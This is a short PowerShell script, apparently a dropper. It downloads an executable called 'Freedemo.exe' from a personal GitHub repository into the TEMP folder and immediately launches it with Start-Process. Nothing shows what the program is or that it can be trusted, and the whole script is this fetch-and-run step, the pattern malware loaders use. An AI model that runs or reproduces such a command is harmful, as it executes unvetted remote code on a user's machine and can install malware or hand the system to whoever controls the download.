$url = "https://raw.githubusercontent.com/kittipatseepakdee-eng/180cri/refs/heads/main/Freedemo.exe"
$file = "$env:TEMP\Freedemo.exe"

Invoke-WebRequest $url -OutFile $file
Start-Process $file